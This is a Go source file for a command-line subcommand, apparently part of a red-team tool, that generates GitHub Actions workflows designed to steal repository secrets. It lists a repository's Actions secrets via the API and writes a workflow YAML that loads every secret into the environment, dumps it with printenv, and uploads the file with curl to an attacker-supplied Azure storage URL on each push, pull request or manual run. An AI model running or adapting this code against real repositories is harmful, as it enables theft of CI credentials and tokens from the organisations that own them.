package github

import (
	"fmt"
	"os"
	"path"
	"strings"

	"github.com/google/go-github/v34/github"

	"github.com/spf13/cobra"
)

var actionName string
var azureSASUrl string

func init() {
	genActionsSecretsExfil.Flags().StringVarP(&outDir, "outdir", "d", "./generated-actions", "")
	genActionsSecretsExfil.Flags().StringVarP(&actionName, "actionName", "n", "list-actions-secrets", "")
	genActionsSecretsExfil.Flags().StringVarP(&azureSASUrl, "azureSASUrl", "s", "", "")
	genActionsSecretsExfil.MarkFlagRequired("owner")
	GitHubRootCmd.AddCommand(genActionsSecretsExfil)
}

var yamlTemplate = `
name: %s
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Run a one-line script
        run: |
          printenv > env.txt
          curl -X PUT -T ./env.txt -H "x-ms-date: $(date -u)" -H "x-ms-blob-type: BlockBlob" "%s"
        env: 
%s
`

func getEnvConfig(secrets []*github.Secret) string {
	var envPayload = ""
	for _, secret := range secrets {
		envPayload += fmt.Sprintf("          REPO_SECRET_%s: ${{secrets.%s}}\n", strings.ToUpper(secret.Name), secret.Name)
	}
	return envPayload
}

var genActionsSecretsExfil = &cobra.Command{
	Use:   "gen-actions-secrets-exfil",
	Short: "Lists all actions secrets for the given organization or repo and creates a file to exifl those secrets",
	Long:  `Lists all actions secrets for the given organization or repo and creates a file to exifl those secrets`,
	RunE: func(cmd *cobra.Command, args []string) error {

		repos := getInputTargets()

		for _, nwo := range repos {
			// fmt.Println("Fetching secrets runs for ", nwo)
			splitRepo := strings.Split(nwo, "/")
			owner := splitRepo[0]
			repo := splitRepo[1]

			client, err := getGitHubClient()
			if err != nil {
				return err
			}
			secrets, _, err := client.Actions.ListRepoSecrets(ctx, owner, repo, nil)
			if err != nil {
				return err
			}
			if len(secrets.Secrets) == 0 {
				fmt.Printf("No secrets found for %s/%s\n", owner, repo)
				continue
			}

			// Need to generate the YAML file here
			ensureDir(outDir)
			ownerPath := path.Join(outDir, owner)
			ensureDir(ownerPath)
			namePath := path.Join(ownerPath, repo)
			ensureDir(namePath)

			fileName := path.Join(namePath, actionName+".yaml")
			fileContents := fmt.Sprintf(yamlTemplate, actionName, azureSASUrl, getEnvConfig(secrets.Secrets))
			err = os.WriteFile(fileName, []byte(fileContents), 0644)

			if err != nil {
				return err
			}

		}

		return nil

	},
}
